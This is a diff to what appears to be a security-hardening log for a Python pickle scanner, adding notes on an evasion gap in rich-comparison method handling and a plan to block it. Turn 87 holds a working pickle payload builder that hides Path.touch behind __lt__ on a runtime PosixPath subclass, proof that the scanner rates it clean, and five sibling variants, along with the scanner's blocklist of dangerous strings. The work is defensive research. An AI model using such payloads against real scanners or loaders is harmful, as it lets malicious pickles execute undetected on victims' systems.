@@ -4202,3 +4202,145 @@ Blocking plan:
 
 Performance note: one literal in the existing magic-method match arm, no
 item-protocol flow modeling.
+
+## Turn 87 - Ordering rich-comparison method family gap
+
+Candidate payload:
+
+- Create a runtime subclass with `builtins.type`.
+- Use `pathlib.PosixPath` as the base class so instances are valid filesystem
+  paths.
+- Install `pathlib.Path.touch` as an ordering rich-comparison method, for
+  example `__lt__`.
+- Instantiate the class with a marker path.
+- Call the matching clean `operator` helper, for example
+  `operator.lt(instance, 0o666)`, during unpickling.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    return b"U" + bytes([len(data)]) + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_operator_lt_dunder_lt_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("builtins", "type"),
+        b"(",
+        text("DerivedPath"),
+        sg("pathlib", "PosixPath"),
+        b"\x85",
+        b"}",
+        text("__lt__"),
+        sg("pathlib", "Path.touch"),
+        b"s",
+        b"tR\x940",
+        b"h\x00",
+        text(str(marker)),
+        b"\x85R\x940",
+        sg("operator", "lt"),
+        b"h\x01",
+        b"M" + (0o666).to_bytes(2, "little"),
+        b"\x86R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12 for the `__lt__` representative:
+
+- Control scanner result: `len=138`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- RCE scanner result: `len=158`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- Coverage for the RCE payload: `bytes_scanned=158`, `bytes_total=158`,
+  `opcode_count=34`, `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
+  `pathlib.Path.touch`, and `operator.lt`, all with `is_dangerous=False`
+- Control proof: the same pickle without the final `operator.lt` call returns
+  a `DerivedPath` instance at `/tmp/ma_operator_lt_dunder_lt_marker` and does
+  not create the marker
+- Unpickle result: the full payload creates
+  `/tmp/ma_operator_lt_dunder_lt_marker` and returns `None`
+
+Sibling slot proof:
+
+| Operator | Method | Scanner verdict | Runtime result |
+| --- | --- | --- | --- |
+| `operator.lt` | `__lt__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.le` | `__le__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.gt` | `__gt__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.ge` | `__ge__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.ne` | `__ne__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+
+RCE mechanism:
+
+- `type(...)` builds a `pathlib.PosixPath` subclass with an attacker-controlled
+  rich-comparison slot such as `__lt__ = pathlib.Path.touch`.
+- The payload instantiates that subclass for the marker path.
+- `operator.lt(instance, 0o666)` dispatches to `instance.__lt__(0o666)`.
+- Because `__lt__` points at `Path.touch`, CPython calls
+  `Path.touch(instance, mode=0o666)`. Rich-comparison functions may return
+  arbitrary Python objects, so the `None` result is returned normally after the
+  file is created.
+
+Why the scanner missed it:
+
+- `__eq__` is in the suspicious magic-method string list, but the remaining
+  rich-comparison slots `__lt__`, `__le__`, `__gt__`, `__ge__`, and `__ne__`
+  are not.
+- `operator.lt`, `operator.le`, `operator.gt`, `operator.ge`, and
+  `operator.ne` are absent from `DANGEROUS_GLOBALS`; current `operator`
+  coverage includes `call`, `attrgetter`, `itemgetter`, and `methodcaller`.
+- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
+  wildcard-dangerous module.
+- The dangerous callable is hidden as a synthesized rich-comparison method, so
+  the final visible call target is a common comparison helper rather than the
+  attacker-selected callable.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, `subprocess`, `__getattr__`,
+  `__getattribute__`, `__del__`, `__contains__`, or `__setitem__`.
+
+Performance note: the focused next block should add the remaining
+rich-comparison slot names (`__lt__`, `__le__`, `__gt__`, `__ge__`, and
+`__ne__`) to the suspicious magic-method string list. That keeps the hot path
+to five additional literals in the existing string policy and avoids
+rich-comparison flow modeling.
+
+## Turn 88 - Block ordering rich-comparison seeds
+
+Blocking plan:
+
+- Add `__lt__`, `__le__`, `__gt__`, `__ge__`, and `__ne__` to the existing
+  suspicious magic-method string list. These slots can route execution through
+  rich-comparison dispatch without an explicit dangerous call target.
+- Leave `operator.lt`, `operator.le`, `operator.gt`, `operator.ge`,
+  `operator.ne`, `builtins.type`, `pathlib.PosixPath`, and
+  `pathlib.Path.touch` allowed for this focused block. The static signal is
+  the attacker-controlled rich-comparison slot name.
+- Add a CPython oracle regression that builds
+  `type(..., {"__lt__": Path.touch})`-style payloads for all five ordering
+  slots, verifies scan-time detection on both construction-only controls and
+  active `operator.*` RCE variants, proves the control instances do not create
+  markers, then proves each comparison creates its marker during
+  `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: five literals in the existing magic-method match arm, no
+rich-comparison flow modeling.
